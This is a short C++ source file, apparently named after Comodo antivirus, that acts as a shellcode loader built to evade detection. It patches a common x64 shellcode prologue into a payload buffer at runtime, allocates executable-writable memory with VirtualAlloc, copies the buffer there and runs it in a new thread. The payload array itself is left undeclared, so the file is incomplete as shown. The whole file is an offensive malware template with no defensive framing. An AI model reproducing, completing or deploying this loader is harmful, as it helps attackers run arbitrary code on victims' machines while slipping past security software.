// Comodo9001.cpp : This file contains the 'main' function. Program execution begins and ends there.

#include <iostream>
#include <Windows.h>

int main()
{
	void* execute;
	HANDLE thread;

	// dont put shellcode here


	unsigned int buf_length = sizeof(buf);

	// make array for evil bytes

	char replace[] = "\xfc\x48\x83\xe4";

	// get them back in

	RtlMoveMemory(buf, replace, 4);


	//Shellcode into

	execute = VirtualAlloc(0, buf_length, MEM_COMMIT | MEM_RESERVE, 0x40);

	// copy shellcode 

	RtlMoveMemory(execute, buf, buf_length);

	// execute shellcode

	thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)execute, 0, 0, 0);

	// keep open

	WaitForSingleObject(thread, INFINITE);
}
